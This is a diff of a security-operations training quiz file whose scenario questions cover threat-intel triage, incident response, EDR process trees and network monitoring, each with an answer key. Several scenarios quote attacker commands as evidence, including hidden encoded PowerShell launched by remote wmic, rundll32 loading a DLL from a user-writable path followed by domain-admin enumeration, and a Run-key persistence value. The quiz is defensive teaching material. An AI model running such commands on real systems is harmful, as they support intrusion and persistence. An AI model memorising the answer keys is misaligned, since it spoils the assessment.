-        correctAnswer: 2,
-        explanation: "Immediate escalation is required for confirmed active threats like ransomware, data exfiltration, or compromised privileged accounts."
-      },
-      {
-        id: "q4-9",
-        question: "What is alert fatigue?",
-        options: [
-          "Physical tiredness from work",
-          "Decreased vigilance due to overwhelming volume of alerts",
-          "A type of malware",
-          "Network congestion"
-        ],
-        correctAnswer: 1,
-        explanation: "Alert fatigue occurs when analysts become desensitized due to high volumes of alerts, potentially causing them to miss real threats."
-      },
-      {
-        id: "q4-10",
-        question: "What information should be included in alert documentation?",
-        options: [
-          "Only the alert title",
-          "Analyst's personal opinions only",
-          "Timeline, findings, evidence, verdict, and actions taken",
-          "Just the date and time"
-        ],
-        correctAnswer: 2,
-        explanation: "Complete documentation includes timeline, investigation steps, findings, evidence collected, verdict, and actions taken."
+        explanation: "Mature detection programs follow a lifecycle: hypothesis -> data availability -> logic -> validation -> tuning -> documentation. Skipping any step is how you get rules nobody trusts or knows how to triage."
       }
     ]
   },
   {
     quizId: "q5",
     courseId: "soc-fundamentals",
-    title: "Threat Intelligence Quiz",
-    description: "Evaluate your understanding of threat intelligence, IOCs, and OSINT techniques.",
+    title: "Threat Intelligence in Action",
+    description: "Scenario quiz on applying CTI to detection, triage, and decisions.",
     passingScore: 75,
     timeLimit: 20,
     questions: [
       {
         id: "q5-1",
-        question: "What are the four types of threat intelligence?",
+        difficulty: "medium",
+        tags: ["IOC Lifecycle"],
+        scenario: "A vendor IOC feed pushes 80,000 IPs/day. You ingest them all as blocklists. Within a week, you see business outages from blocked legitimate services.",
+        question: "What was the core mistake?",
         options: [
-          "Red, Blue, Green, Yellow",
-          "Strategic, Tactical, Operational, Technical",
-          "Primary, Secondary, Tertiary, Quaternary",
-          "Internal, External, Public, Private"
+          "Using a vendor feed at all",
+          "Treating raw, low-confidence, short-lived indicators as enforcement data without scoring, dedup, source reputation, and expiry — IOCs need a lifecycle (ingest -> score -> act -> age out)",
+          "Not buying more feeds",
+          "Blocking IPs is always wrong"
         ],
         correctAnswer: 1,
-        explanation: "The four types are Strategic (high-level trends), Tactical (TTPs), Operational (campaign details), and Technical (IOCs)."
+        explanation: "Mature CTI applies confidence scoring (TLP, source rep), an action tier (alert vs. block), and an expiry policy. Raw firehose feeds belong in detection/enrichment first, enforcement only after scoring."
       },
       {
         id: "q5-2",
-        question: "What does IOC stand for?",
+        difficulty: "hard",
+        tags: ["Diamond Model"],
+        scenario: "Investigation finds: adversary 'FIN8', capability 'Sardonic backdoor', infrastructure '198.51.100.50', victim 'retail point-of-sale'.",
+        question: "These four facets map to which model, and what is its analytical value?",
         options: [
-          "Internal Operations Center",
-          "Indicator of Compromise",
-          "Internet of Computers",
-          "Intrusion of Command"
+          "Cyber Kill Chain — they are kill-chain phases",
+          "Diamond Model — the four vertices (Adversary, Capability, Infrastructure, Victim); pivoting along any edge expands the investigation (e.g., same capability seen at other victims)",
+          "STRIDE — threat modeling",
+          "OWASP Top 10"
         ],
         correctAnswer: 1,
-        explanation: "IOC stands for Indicator of Compromise - forensic artifacts that identify potentially malicious activity."
+        explanation: "Diamond Model is built for relational pivoting across the four facets. Each edge enables a hypothesis ('what other victims share this infrastructure?' 'what other capabilities does this adversary use?'). It pairs naturally with ATT&CK and the Kill Chain."
       },
       {
         id: "q5-3",
-        question: "According to the Pyramid of Pain, which IOC type is hardest for attackers to change?",
+        difficulty: "medium",
+        tags: ["TLP"],
+        scenario: "A peer SOC shares a hot indicator marked TLP:AMBER+STRICT. A vendor sales rep asks you to share it for a webinar.",
+        question: "What may you do?",
         options: [
-          "Hash values",
-          "IP addresses",
-          "TTPs (Tactics, Techniques, Procedures)",
-          "Domain names"
+          "Share it — vendors are trusted partners",
+          "Post it to Twitter to warn the community",
+          "Refuse; TLP:AMBER+STRICT restricts sharing to the recipient organization only — you cannot redistribute externally without explicit permission from the source",
+          "Forward it but remove the source name"
         ],
         correctAnswer: 2,
-        explanation: "TTPs are at the top of the Pyramid of Pain - they represent how attackers operate and are hardest to change."
+        explanation: "TLP:AMBER = limited distribution within the recipient org and clients with need-to-know. The +STRICT modifier removes the 'clients' clause. Violating TLP destroys trust and intel-sharing relationships."
       },
       {
         id: "q5-4",
-        question: "What is OSINT?",
+        difficulty: "hard",
+        tags: ["Pivoting", "OSINT"],
+        scenario: "You have one C2 domain: secure-update-cdn[.]net (registered 4 days ago, NameCheap, Cloudflare-fronted).",
+        question: "Which pivot sequence yields the MOST analytical value?",
         options: [
-          "Operating System Intelligence",
-          "Open Source Intelligence - publicly available information",
-          "Offensive Security Integration",
-          "Online System Integration"
+          "Just block the domain",
+          "Pivot: WHOIS registrant email -> other domains by same email/phone -> passive DNS for historical IPs -> certificate SANs (crt.sh) for sibling domains -> sample any hosted content via sandbox -> map findings to ATT&CK and check internal telemetry for hits on all discovered indicators",
+          "Run Nmap against the IP",
+          "Search Google for the domain name"
         ],
         correctAnswer: 1,
-        explanation: "OSINT (Open Source Intelligence) refers to intelligence gathered from publicly available sources."
+        explanation: "Single-indicator -> infrastructure cluster is the heart of CTI pivoting. WHOIS + passive DNS + cert transparency consistently reveal sibling infrastructure that the adversary is already using or about to use — letting you detect ahead, not behind."
       },
       {
         id: "q5-5",
-        question: "Which platform is commonly used for file hash and URL analysis?",
+        difficulty: "medium",
+        tags: ["Strategic vs Tactical"],
+        scenario: "Your CISO asks: 'Should we be worried about the new Volt Typhoon reporting?' She wants 1 page.",
+        question: "Which CTI deliverable level is this?",
         options: [
-          "Microsoft Word",
-          "VirusTotal",
-          "Photoshop",
-          "Excel"
+          "Tactical — IOCs and hashes",
+          "Operational — campaign-level TTPs",
+          "Strategic — business risk, sector targeting, board-level implications and recommended posture changes",
+          "Technical — malware reverse engineering"
         ],
-        correctAnswer: 1,
-        explanation: "VirusTotal is a widely used platform for analyzing files, URLs, IPs, and domains against multiple security engines."
+        correctAnswer: 2,
+        explanation: "CTI tiers: Strategic (executive, business risk), Operational (campaigns/TTPs for IR/hunt), Tactical (IOCs for detection/blocking), Technical (deep reverse engineering). Knowing the audience determines the output."
       },
       {
         id: "q5-6",
-        question: "What is a TIP (Threat Intelligence Platform)?",
+        difficulty: "hard",
+        tags: ["IOC Confidence"],
+        scenario: "Same IP 203.0.113.99 appears in:\n  - Internal: failed C2 sinkhole hit (1 hit, last week)\n  - Open-source feed: '1,200 confidence votes, malware C2'\n  - Commercial: 'shared hosting, mixed reputation'\n  - VirusTotal: 3/89 detections, all generic",
+        question: "What is the correct decision?",
         options: [
-          "A gratuity calculator",
-          "A platform that aggregates and operationalizes threat data",
-          "A typing improvement program",
-          "A network scanner"
-        ],
-        correctAnswer: 1,
-        explanation: "A TIP aggregates, normalizes, enriches, and helps operationalize threat intelligence from multiple sources."
-      },
-      {
-        id: "q5-7",
-        question: "What is a red flag when analyzing a domain?",
-        options: [
-          "It's been registered for 10 years",
-          "It was recently registered and uses privacy protection",
-          "It has valid SSL certificates",
-          "It's hosted by a major cloud provider"
-        ],
-        correctAnswer: 1,
-        explanation: "Recently registered domains with privacy protection are often suspicious, especially if they mimic legitimate brands."
-      },
-      {
-        id: "q5-8",
-        question: "What hash algorithm is the current standard for file identification?",
-        options: [
-          "MD5",
-          "SHA1",
-          "SHA256",
-          "CRC32"
+          "Block immediately at perimeter — most sources flag it",
+          "Ignore — VT score is low",
+          "Alert (not block) and enrich: shared hosting + low VT + only 1 internal hit = high false-positive risk for blocking; collect more context before enforcement",
+          "Add to threat report and forget"
         ],
         correctAnswer: 2,
-        explanation: "SHA256 is the current standard - MD5 and SHA1 are being phased out due to collision vulnerabilities."
-      },
-      {
-        id: "q5-9",
-        question: "What is pivoting in threat intelligence?",
-        options: [
-          "Rotating your chair",
-          "Moving from one indicator to discover related indicators",
-          "Deleting old data",
-          "Changing passwords"
-        ],
-        correctAnswer: 1,
-        explanation: "Pivoting means using one indicator (like an IP) to find related indicators (domains, hashes) and uncover the full threat picture."
-      },
-      {
-        id: "q5-10",
-        question: "What is AbuseIPDB used for?",
-        options: [
-          "Managing IP addresses",
-          "Checking IP reputation and abuse reports",
-          "Assigning IP addresses",
-          "Creating VPNs"
-        ],
-        correctAnswer: 1,
-        explanation: "AbuseIPDB is a community-driven database for checking and reporting malicious IP addresses."
-      },
-      {
-        id: "q5-11",
-        question: "Which type of threat intelligence is consumed by executives?",
-        options: [
-          "Technical",
-          "Tactical",
-          "Strategic",
-          "Operational"
-        ],
-        correctAnswer: 2,
-        explanation: "Strategic intelligence provides high-level trends and risk assessments intended for executive and management consumption."
-      },
-      {
-        id: "q5-12",
-        question: "What is a DGA (Domain Generation Algorithm)?",
-        options: [
-          "A method to create legitimate websites",
-          "Malware technique that generates random domain names for C2",
-          "A domain registration service",
-          "A security certification"
-        ],
-        correctAnswer: 1,
-        explanation: "DGA is used by malware to generate random-looking domain names for command and control, making blocking difficult."
+        explanation: "Shared/CDN infrastructure + thin internal evidence + weak AV consensus = classic 'alert and enrich,' not 'block.' Confidence scoring across sources prevents self-inflicted outages — a recurring real-world CTI failure mode."
       }
     ]
   },
   {
     quizId: "q6",
     courseId: "soc-fundamentals",
-    title: "Incident Response Quiz",
-    description: "Test your knowledge of the incident response lifecycle, containment, and documentation.",
+    title: "Incident Response Decisions",
+    description: "NIST IR lifecycle applied to live incidents — containment, eradication, recovery, lessons learned.",
     passingScore: 75,
     timeLimit: 25,
     questions: [
       {
         id: "q6-1",
-        question: "What are the four phases of the NIST Incident Response lifecycle?",
+        difficulty: "medium",
+        tags: ["Containment"],
+        scenario: "EDR confirms ransomware actively encrypting files on a single workstation, WS-203. Network share \\\\fileserver\\finance is mounted from that host.",
+        question: "What is the CORRECT first containment step?",
         options: [
-          "Plan, Do, Check, Act",
-          "Preparation, Detection & Analysis, Containment/Eradication/Recovery, Post-Incident",
-          "Alert, Investigate, Close, Report",
-          "Identify, Protect, Detect, Respond"
+          "Power off WS-203 (pull the plug) immediately",
+          "Network-isolate WS-203 via EDR (preserves memory + running process for forensics) AND temporarily revoke the user's share permissions on \\\\fileserver\\finance",
+          "Reimage WS-203",
+          "Wait until you understand the variant"
         ],
         correctAnswer: 1,
-        explanation: "NIST defines four phases: Preparation, Detection & Analysis, Containment/Eradication/Recovery, and Post-Incident Activity."
+        explanation: "Network isolation (EDR containment) stops lateral encryption and C2 while preserving volatile evidence — pulling power destroys memory artifacts (keys, injected code). Cutting the user's share rights protects the secondary blast radius."
       },
       {
         id: "q6-2",
-        question: "What is the purpose of the containment phase?",
+        difficulty: "hard",
+        tags: ["Evidence", "Chain of Custody"],
+        scenario: "You suspect this incident may lead to litigation. You took a triage memory dump and ran several commands on the live host.",
+        question: "What MUST you document for evidence to remain admissible?",
         options: [
-          "To delete all evidence",
-          "To stop the attack from spreading while preserving evidence",
-          "To notify the press",
-          "To ignore the incident"
+          "Nothing — EDR logs everything",
+          "Chain of custody: who collected/handled what, when, with which tool/version, hashes (SHA-256) of every artifact at collection, storage location, and every transfer signed/dated",
+          "Just save the files",
+          "Email the files to legal"
         ],
         correctAnswer: 1,
-        explanation: "Containment stops the attack from spreading to other systems while preserving evidence for investigation."
+        explanation: "Admissibility hinges on demonstrable integrity (hashes at collection and at use) and an unbroken chain (every handler, every transfer). Without it, defense counsel will exclude the evidence — and your investigation collapses."
       },
       {
         id: "q6-3",
-        question: "Which severity level requires immediate response for active ransomware?",
+        difficulty: "medium",
+        tags: ["NIST Lifecycle"],
+        scenario: "After containment of a webshell on a public web server, you have removed the file, rotated credentials, and restored from backup. Tickets are closed.",
+        question: "What essential NIST phase is being skipped?",
         options: [
-          "Low",
-          "Medium",
-          "High",
-          "Critical"
+          "Detection",
+          "Containment",
+          "Lessons Learned / Post-Incident: root-cause analysis (how did the webshell get there?), control gaps, detection improvements, and runbook updates — without this, the same incident recurs",
+          "Preparation"
         ],
-        correctAnswer: 3,
-        explanation: "Active ransomware encryption is a Critical (Severity 1) incident requiring immediate, all-hands response."
+        correctAnswer: 2,
+        explanation: "Skipping post-incident review is the most common immaturity in young IR programs. The webshell got there via an unpatched CVE or a misconfig; closing without RCA guarantees recurrence."
       },
       {
         id: "q6-4",
-        question: "What is the first containment action for a compromised user account?",
+        difficulty: "hard",
+        tags: ["Eradication"],
+        scenario: "You eradicated malware on 3 hosts. A week later, the same malware re-appears on host #4 in the same subnet.",
+        question: "What is the MOST likely root cause and the right fix?",
         options: [
-          "Delete the account",
-          "Reset password and terminate active sessions",
-          "Send an email to the user",
-          "Wait for management approval"
+          "Bad luck — repeat eradication",
+          "Eradication was incomplete: missed persistence (scheduled task, service, WMI, AD scheduled object, or a compromised credential/shared script). Hunt across the environment for the original initial-access vector and persistence indicators BEFORE re-eradicating",
+          "Antivirus signature outdated",
+          "Vendor needs to be called"
         ],
         correctAnswer: 1,
-        explanation: "For account compromise, immediately reset the password and terminate all active sessions to prevent further unauthorized access."
+        explanation: "Reinfection nearly always means root cause (initial access) or persistence was missed. Mature IR scopes the full footprint (all hosts, all persistence locations, all credentials touched) before declaring eradication."
       },
       {
         id: "q6-5",
-        question: "What should you NOT do when ransomware is detected?",
+        difficulty: "medium",
+        tags: ["Communication"],
+        scenario: "30 minutes into a major incident, the CEO walks into the SOC and asks 'is our customer data safe?'",
+        question: "Best response?",
         options: [
-          "Isolate affected systems immediately",
-          "Immediately reboot the infected machine",
-          "Preserve ransom notes and file samples",
-          "Alert the IR team"
+          "'Yes, everything is fine'",
+          "'We don't know yet — we are not ignoring you'",
+          "'We have contained the affected host and are investigating scope. Current evidence does not show customer-database access; I will confirm or update you in 30 minutes.' (factual, scoped, time-bounded)",
+          "Refuse to speak until investigation is complete"
         ],
-        correctAnswer: 1,
-        explanation: "Don't reboot - it may trigger more encryption or destroy volatile evidence. Focus on isolation and preservation first."
+        correctAnswer: 2,
+        explanation: "Executive communications during incidents must be factual, scoped to what is known, and include a next-update commitment. Never speculate (false reassurance is reputational suicide); never stonewall (drives parallel un-coordinated action)."
       },
       {
         id: "q6-6",
-        question: "What is the purpose of a post-incident review?",
+        difficulty: "hard",
+        tags: ["Recovery"],
+        scenario: "You restored 12 production servers from backup. The business asks 'can we put them back online now?'",
+        question: "Correct gating criteria before re-connection?",
         options: [
-          "To assign blame",
-          "To learn and improve processes for future incidents",
-          "To delete incident records",
-          "To award bonuses"
+          "Yes — backups are clean by definition",
+          "Only after: (1) backup verified pre-incident clean (date + integrity), (2) initial-access vector closed (patch/config), (3) credentials rotated, (4) heightened monitoring & detection deployed for known TTPs, (5) recovery validated in an isolated segment first",
+          "Yes — but only at night",
+          "Wait 30 days regardless"
         ],
         correctAnswer: 1,
-        explanation: "Post-incident reviews focus on lessons learned and process improvement, not blame, to prevent similar incidents."
-      },
-      {
-        id: "q6-7",
-        question: "What is an incident playbook?",
-        options: [
-          "A children's game",
-          "A standardized procedure for responding to specific incident types",
-          "A list of employee contacts",
-          "A software application"
-        ],
-        correctAnswer: 1,
-        explanation: "Playbooks provide standardized, step-by-step procedures for responding to common incident types like phishing or malware."
-      },
-      {
-        id: "q6-8",
-        question: "What should be included in incident documentation?",
-        options: [
-          "Only the incident title",
-          "Timeline, affected systems, actions taken, and evidence collected",
-          "Personal opinions about the attacker",
-          "Just the close date"
-        ],
-        correctAnswer: 1,
-        explanation: "Documentation should include timeline, affected systems/users, all actions taken, evidence collected, and findings."
-      },
-      {
-        id: "q6-9",
-        question: "When responding to phishing with credential entry, what must you check for?",
-        options: [
-          "Only reset the password",
-          "Email forwarding rules and account activity since compromise",
-          "The user's vacation schedule",
-          "Nothing else is needed"
-        ],
-        correctAnswer: 1,
-        explanation: "Always check for malicious email forwarding rules and review all account activity since the compromise occurred."
-      },
-      {
-        id: "q6-10",
-        question: "What is 'eradication' in incident response?",
-        options: [
-          "Deleting all company data",
-          "Removing malware, patching vulnerabilities, and resetting credentials",
-          "Firing employees",
-          "Shutting down the company"
-        ],
-        correctAnswer: 1,
-        explanation: "Eradication involves removing malware, patching vulnerabilities, resetting compromised credentials, and cleaning affected systems."
-      },
-      {
-        id: "q6-11",
-        question: "What is the 'chain of custody' in incident response?",
-        options: [
-          "The order of incident responders",
-          "Documentation tracking who handled evidence and when",
-          "The management hierarchy",
-          "A type of malware"
-        ],
-        correctAnswer: 1,
-        explanation: "Chain of custody documents who collected, handled, and stored evidence, ensuring its integrity for potential legal proceedings."
-      },
-      {
-        id: "q6-12",
-        question: "How should severity be adjusted based on affected systems?",
-        options: [
-          "All systems are equal",
-          "Increase severity for critical assets like domain controllers",
-          "Decrease severity for servers",
-          "Severity is never changed"
-        ],
-        correctAnswer: 1,
-        explanation: "Critical assets like domain controllers, databases with sensitive data, and executive systems warrant increased severity."
+        explanation: "Recovery without closing the root cause and adding heightened monitoring is how organizations get re-owned within days. The five-gate checklist is the IR-team minimum and the basis of every post-incident hardening report."
       }
     ]
   },
   {
     quizId: "q7",
     courseId: "soc-fundamentals",
-    title: "EDR & Endpoint Security Quiz",
-    description: "Test your understanding of EDR technology, alerts, and process analysis.",
+    title: "EDR & Endpoint Investigation",
+    description: "Process trees, behavioral detections, and endpoint forensics scenarios.",
     passingScore: 75,
     timeLimit: 20,
     questions: [
       {
         id: "q7-1",
-        question: "What is the main advantage of EDR over traditional antivirus?",
+        difficulty: "medium",
+        tags: ["Process Tree"],
+        scenario: "EDR process tree:\n  services.exe -> svchost.exe -> rundll32.exe C:\\Users\\Public\\a.dll,Start -> cmd.exe -> whoami /all\n                                                                              -> net group \"Domain Admins\" /domain",
+        question: "What is the most accurate interpretation?",
         options: [
-          "It's cheaper",
-          "Behavioral detection and rich telemetry for investigation",
-          "It doesn't require installation",
-          "It only works on Macs"
+          "Routine system activity",
+          "Suspicious DLL side-loaded via rundll32 from a user-writable path, then performing host & domain reconnaissance (T1087.001/.002). Likely post-exploitation; isolate and investigate the DLL origin",
+          "Antivirus scanning",
+          "Patch installation"
         ],
         correctAnswer: 1,
-        explanation: "EDR provides behavioral detection (not just signatures) and rich telemetry including process, file, network, and registry data."
+        explanation: "rundll32 executing a DLL from C:\\Users\\Public, followed immediately by whoami + Domain Admin enumeration, is the post-exploitation signature of a hands-on-keyboard adversary or a discovery payload."
       },
       {
         id: "q7-2",
-        question: "What does a process tree show in EDR?",
+        difficulty: "hard",
+        tags: ["Living Off the Land"],
+        scenario: "You see `wmic process call create \"powershell -nop -w hidden -e <base64>\"` executed remotely by a domain account against 18 servers in 4 minutes.",
+        question: "What is this and what is the priority action?",
         options: [
-          "A list of files",
-          "Parent-child relationships between processes",
-          "Network topology",
-          "User permissions"
+          "Authorized patching tool",
+          "Lateral movement via WMI (T1047) with encoded payload — likely an active intrusion. Disable the compromised account, isolate target hosts, capture memory, and decode the payload offline",
+          "Performance monitoring",
+          "Backup job"
         ],
         correctAnswer: 1,
-        explanation: "Process trees show parent-child relationships, revealing how processes spawned each other - essential for understanding attack chains."
+        explanation: "WMI remote process creation with hidden encoded PowerShell across many hosts in minutes is a hallmark lateral-movement pattern (Cobalt Strike `wmi`, Impacket `wmiexec`, manual `wmic`). Account containment first to halt the spread."
       },
       {
         id: "q7-3",
-        question: "Which scenario is suspicious in a process tree?",
+        difficulty: "medium",
+        tags: ["EDR vs AV"],
+        scenario: "Comparing two products on the same incident: legacy AV flagged nothing; EDR flagged 7 behaviors and built a process tree.",
+        question: "Which statement best explains the difference?",
         options: [
-          "Chrome spawning Chrome processes",
-          "Word or Excel spawning PowerShell or cmd.exe",
-          "Explorer launching Notepad",
-          "Services.exe starting a Windows service"
+          "EDR has better signatures",
+          "AV is signature/hash-based and misses novel/fileless attacks; EDR records process, file, registry, and network telemetry, enabling behavioral detection, retrospective hunting, and response actions",
+          "AV is more secure",
+          "They are the same"
         ],
         correctAnswer: 1,
-        explanation: "Office applications (Word, Excel) spawning scripting engines (PowerShell, cmd) is a classic malware delivery indicator."
+        explanation: "EDR's advantage is telemetry + behavioral analytics + response, not just 'better signatures.' This is also why EDR enables threat hunting and forensics whereas AV cannot."
       },
       {
         id: "q7-4",
-        question: "What type of EDR response action isolates a host?",
+        difficulty: "hard",
+        tags: ["Forensics", "Volatile Data"],
+        scenario: "Suspected fileless malware on a live host. You have 30 minutes before the user returns.",
+        question: "What is the CORRECT collection order?",
         options: [
-          "Process termination",
-          "Network containment/isolation",
-          "File deletion",
-          "User logout"
+          "Disk image first, then memory",
+          "Order of Volatility: 1) CPU/registers/cache state (rare), 2) RAM (memory dump), 3) Network connections + running processes, 4) Disk artifacts, 5) Archived logs. Memory FIRST because fileless lives only in RAM",
+          "Reboot the host to clear suspicious processes",
+          "Run AV scan first"
         ],
         correctAnswer: 1,
-        explanation: "Network containment/isolation blocks all network traffic except EDR communication, containing the threat."
+        explanation: "Order of Volatility (RFC 3227): most-volatile first. Fileless malware (reflective DLLs, in-memory PowerShell) leaves nothing on disk — losing RAM loses the case."
       },
       {
         id: "q7-5",
-        question: "What does T1059.001 represent in MITRE ATT&CK?",
+        difficulty: "medium",
+        tags: ["Persistence"],
+        scenario: "Autoruns / Sysmon EID 13 on workstation shows:\n  HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -> \"Updater\" = \"powershell -w hidden -enc ...\"",
+        question: "What is this and what is the right action?",
         options: [
-          "A ticket number",
-          "PowerShell execution technique",
-          "A user account",
-          "A file hash"
+          "Legitimate update mechanism",
+          "User-level Registry Run-key persistence (T1547.001) executing hidden encoded PowerShell. Capture the value, decode offline, remove the key, kill any running instance, and hunt the same pattern across the fleet",
+          "Group Policy",
+          "Windows feature"
         ],
         correctAnswer: 1,
-        explanation: "T1059.001 is the MITRE ATT&CK technique ID for PowerShell execution under the Command and Scripting Interpreter tactic."
+        explanation: "HKCU Run-key is the most common Windows persistence — survives reboot, runs as the user, and is trivially deployable. Always decode the payload OFFLINE (sandbox/safe env), not by executing it on the host."
       },
       {
         id: "q7-6",
-        question: "What should you check when analyzing a suspicious process?",
+        difficulty: "hard",
+        tags: ["Response Actions"],
+        scenario: "EDR offers: kill process, quarantine file, isolate host, block hash globally, retrieve file, run script.",
+        question: "An active beacon is detected on a JUMP server used by all admins. What sequence is BEST?",
         options: [
-          "Only the process name",
-          "Command line arguments, parent process, file location, and network connections",
-          "Just the timestamp",
-          "The user's email"
+          "Block hash globally first, then investigate",
+          "1) Isolate host (stops spread + preserves state), 2) Retrieve the beacon binary for analysis, 3) Capture memory, 4) Kill the process, 5) Quarantine file, 6) Globally block hash, 7) Hunt for hash + behavior fleet-wide",
+          "Reboot the jump server",
+          "Kill the process first to stop activity"
         ],
         correctAnswer: 1,
-        explanation: "Analyze command line arguments, parent process legitimacy, file location, digital signature, and network connections."
-      },
-      {
-        id: "q7-7",
-        question: "What is a LOLBAS/LOLBIN?",
-        options: [
-          "A type of malware",
-          "Legitimate system binaries abused for malicious purposes",
-          "A security certification",
-          "A logging format"
-        ],
-        correctAnswer: 1,
-        explanation: "LOLBAS (Living Off The Land Binaries and Scripts) are legitimate system tools like certutil or mshta abused by attackers."
-      },
-      {
-        id: "q7-8",
-        question: "Which PowerShell flag combination is commonly used for evasion?",
-        options: [
-          "-Help",
-          "-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass",
-          "-Version",
-          "-Update"
-        ],
-        correctAnswer: 1,
-        explanation: "These flags hide the window, bypass security policies, and avoid loading profiles - classic evasion techniques."
-      },
-      {
-        id: "q7-9",
-        question: "What does LSASS access typically indicate?",
-        options: [
-          "Normal Windows operation only",
-          "Potential credential dumping attack",
-          "Antivirus update",
-          "System shutdown"
-        ],
-        correctAnswer: 1,
-        explanation: "Unusual access to LSASS (Local Security Authority Subsystem Service) often indicates credential dumping like Mimikatz."
-      },
-      {
-        id: "q7-10",
-        question: "What telemetry type shows registry persistence?",
-        options: [
-          "Network telemetry",
-          "Registry telemetry",
-          "File telemetry only",
-          "User telemetry"
-        ],
-        correctAnswer: 1,
-        explanation: "Registry telemetry captures modifications to registry keys, including those used for persistence like Run keys."
-      },
-      {
-        id: "q7-11",
-        question: "What is the purpose of the EDR confidence score?",
-        options: [
-          "User satisfaction rating",
-          "How likely the detection represents actual malicious activity",
-          "Network speed measurement",
-          "Storage capacity"
-        ],
-        correctAnswer: 1,
-        explanation: "Confidence score indicates how likely the detection represents actual malicious activity based on the detection logic."
-      },
-      {
-        id: "q7-12",
-        question: "After containing a threat via EDR, what should you do?",
-        options: [
-          "Delete all logs",
-          "Collect evidence and document the investigation",
-          "Immediately reimage the system",
-          "Nothing - job is done"
-        ],
-        correctAnswer: 1,
-        explanation: "After containment, collect evidence (memory, files, logs), document your investigation, and coordinate further response."
+        explanation: "Isolate before kill — killing the process destroys the live state you need to analyze. Retrieve + capture memory while the host is contained but powered, then proceed to kill/quarantine and finally fleet-wide hunting. Jump-server compromise means EVERY admin credential touched recently should also be considered burned."
       }
     ]
   },
   {
     quizId: "q8",
     courseId: "soc-fundamentals",
-    title: "Network Security Quiz",
-    description: "Test your knowledge of network security monitoring, IDS/IPS, and traffic analysis.",
-    passingScore: 70,
+    title: "Network Security Monitoring",
+    description: "NSM scenarios — IDS/IPS, traffic analysis, encrypted-traffic visibility, and pivoting from network signals.",
+    passingScore: 75,
     timeLimit: 25,
     questions: [
       {
         id: "q8-1",
-        question: "What is the difference between IDS and IPS?",
+        difficulty: "medium",
+        tags: ["IDS vs IPS"],
+        scenario: "Your team must protect a critical OT (operational technology) plant network where false-positive blocks could halt production.",
+        question: "What deployment is MOST appropriate?",
         options: [
-          "They are the same thing",
-          "IDS only alerts; IPS can block traffic",
-          "IPS only alerts; IDS can block traffic",
-          "Neither can detect threats"
+          "IPS in-line, block everything by default",
+          "IDS in monitoring (SPAN/TAP) mode for visibility + selective IPS only on high-confidence signatures on the IT/OT boundary; never inline within the OT plant",
+          "Remove all network monitoring",
+          "Use only host antivirus"
         ],
         correctAnswer: 1,
-        explanation: "IDS (Detection System) monitors and alerts passively; IPS (Prevention System) sits inline and can actively block traffic."
+        explanation: "OT environments cannot tolerate false-positive blocks. The mature pattern is rich visibility (IDS/passive) inside the plant, with selective enforcement at the boundary. Knowing when NOT to block is part of the job."
       },
       {
         id: "q8-2",
-        question: "What port does SMB use?",
+        difficulty: "hard",
+        tags: ["Encrypted Traffic"],
+        scenario: "80% of your outbound traffic is TLS-encrypted. You cannot do TLS interception for privacy/regulatory reasons.",
+        question: "Which signals STILL give you meaningful detection on encrypted C2?",
         options: [
-          "80",
-          "443",
-          "445",
-          "22"
+          "None — you must decrypt",
+          "JA3/JA3S (client/server TLS fingerprints), SNI, certificate fields (CN, SAN, issuer, validity, self-signed), DNS queries preceding the connection, destination reputation, beaconing periodicity, byte-volume asymmetry, and ASN/geo of destination",
+          "Only NetFlow",
+          "Only DNS"
         ],
-        correctAnswer: 2,
-        explanation: "SMB (Server Message Block) uses port 445 and is commonly used in lateral movement attacks."
+        correctAnswer: 1,
+        explanation: "Encrypted-traffic analytics is a deep field. TLS metadata (JA3 fingerprints, certs, SNI) + flow behavior (periodicity, asymmetry) + DNS + reputation can detect a remarkable amount without decryption — this is also how modern NDR products operate."
       },
       {
         id: "q8-3",
-        question: "What is beaconing in network traffic?",
+        difficulty: "medium",
+        tags: ["Zeek/Suricata"],
+        scenario: "Suricata fires ET POLICY 'self-signed certificate from internal host to external IP on 443.'",
+        question: "Best interpretation?",
         options: [
-          "Normal web browsing",
-          "Regular-interval callbacks from malware to C2 servers",
-          "Email sending",
-          "File downloads"
+          "Always benign — many sites use self-signed certs",
+          "Suspicious-but-not-conclusive; pivot: process attribution on the source host, destination reputation, JA3 fingerprint match against C2 frameworks (Cobalt Strike default JA3 is well-known), DNS history, and beacon analysis",
+          "Critical — block immediately",
+          "False positive — disable rule"
         ],
         correctAnswer: 1,
-        explanation: "Beaconing is regular-interval communication from infected hosts to command and control servers, a key malware indicator."
+        explanation: "Self-signed certs to external destinations are unusual and worth investigating but not conclusive. The pivots (host process, JA3 match, beacon timing) turn a weak signal into a strong verdict — a classic NSM workflow."
       },
       {
         id: "q8-4",
-        question: "What is DNS tunneling used for?",
+        difficulty: "hard",
+        tags: ["DNS Analysis"],
+        scenario: "Zeek dns.log: a host issues 4,200 TXT-record queries in 10 min to subdomains of *.api-telemetry[.]xyz with average label length 35 characters.",
+        question: "What is the BEST hypothesis?",
         options: [
-          "Faster DNS resolution",
-          "Data exfiltration or C2 communication via DNS queries",
-          "Improving network speed",
-          "Email delivery"
+          "Legitimate DNS-based service discovery",
+          "DNS tunneling / exfiltration (T1071.004 or T1048.003) — long random labels + high TXT volume to a single 2LD = classic tunnel signature; isolate host and pcap immediately",
+          "DNSSEC validation",
+          "Cache warmup"
         ],
         correctAnswer: 1,
-        explanation: "DNS tunneling encodes data in DNS queries/responses to bypass security controls for exfiltration or C2 communication."
+        explanation: "Long, high-entropy labels + dominance of TXT records + tight time window + single 2LD = DNS tunneling. Common tools: iodine, dnscat2, Cobalt Strike DNS mode. Detection patterns: entropy, label length, query volume per 2LD."
       },
       {
         id: "q8-5",
-        question: "What does a high volume of NXDomain responses indicate?",
+        difficulty: "medium",
+        tags: ["NetFlow", "Behavioral"],
+        scenario: "NetFlow shows host A maintaining a single long-lived TCP connection (24h, ~50 packets/min, small) to a high-numbered port on a foreign IP. No legitimate business reason found.",
+        question: "What detection name fits BEST?",
         options: [
-          "Normal DNS activity",
-          "Potential DGA (Domain Generation Algorithm) malware",
-          "Excellent network health",
-          "Fast internet connection"
+          "DDoS attack",
+          "Long-lived low-volume covert channel / interactive C2 — pivot to process attribution, destination reputation, and similar patterns elsewhere; capture pcap if still active",
+          "Backup traffic",
+          "Video streaming"
         ],
         correctAnswer: 1,
-        explanation: "High NXDomain (non-existent domain) responses may indicate DGA malware trying to reach algorithmically generated domains."
